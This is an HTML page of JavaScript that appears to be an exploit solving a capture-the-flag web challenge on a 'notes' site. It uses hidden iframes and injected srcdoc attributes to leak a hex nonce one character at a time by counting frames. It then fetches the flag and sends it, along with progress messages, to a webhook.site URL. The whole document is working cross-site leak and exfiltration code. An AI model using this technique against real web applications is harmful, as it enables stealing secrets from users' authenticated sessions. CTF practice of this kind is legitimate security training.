<!DOCTYPE html>
<html>
<body>
<script>
var CHALL = 'https://notes.chall.lac.tf';
var WH = 'https://webhook.site/923f4208-02d7-482e-ae22-6d7e0278f8d7';
var HEX = '0123456789abcdef';

function ping(msg) { new Image().src = WH + '?' + encodeURIComponent(msg); }
function sleep(ms) { return new Promise(function(r) { setTimeout(r, ms); }); }

ping('v3_loaded');

async function testPosition(prefix) {
  var iframes = [];
  for (var i = 0; i < 16; i++) {
    var c = HEX[i];
    // Inject srcdoc attribute on ad iframes containing a nested <iframe>
    // Ad iframes get srcdoc with nested iframe -> window[i].length = 1
    // Note iframes have plain text srcdoc -> window[i].length = 0
    var url = CHALL + '/?srcdoc=x&referrerPolicy='
      + encodeURIComponent('<iframe></iframe>')
      + '&search=' + encodeURIComponent(prefix + c);
    var f = document.createElement('iframe');
    f.src = url;
    f.setAttribute('data-c', c);
    f.style.cssText = 'width:1px;height:1px;position:absolute;left:-9999px';
    document.body.appendChild(f);
    iframes.push(f);
  }

  await sleep(3500);

  var found = null;
  for (var j = 0; j < iframes.length; j++) {
    var f = iframes[j];
    var c = f.getAttribute('data-c');
    try {
      var total = f.contentWindow.length;
      var withChildren = 0;
      for (var k = 0; k < total; k++) {
        try {
          if (f.contentWindow[k].length > 0) withChildren++;
        } catch(e) {}
      }
      var noteCount = total - withChildren;
      if (noteCount > 0) {
        found = c;
        ping('HIT_c=' + c + '_t=' + total + '_ads=' + withChildren + '_notes=' + noteCount);
      }
    } catch(e) {
      ping('err_' + c + '_' + e.message);
    }
    f.remove();
  }
  return found;
}

async function solve() {
  ping('solving');
  var nonce = '';

  for (var pos = 0; pos < 8; pos++) {
    var found = null;
    for (var att = 0; att < 2 && found === null; att++) {
      ping('pos=' + pos + '_att=' + att + '_pfx=' + nonce);
      found = await testPosition(nonce);
    }
    if (found !== null) {
      nonce += found;
      ping('found=' + found + '_nonce=' + nonce);
    } else {
      ping('FAIL_pos=' + pos + '_nonce=' + nonce);
      break;
    }
  }

  if (nonce.length === 8) {
    ping('fullnonce=' + nonce);
    try {
      var resp = await fetch(CHALL + '/guess?nonce=' + nonce);
      var flag = await resp.text();
      ping('FLAG=' + flag);
      fetch(WH + '/flag=' + encodeURIComponent(flag));
    } catch(e) {
      ping('flagerr=' + e.message);
    }
  }
}

solve();
</script>
</body>
</html>
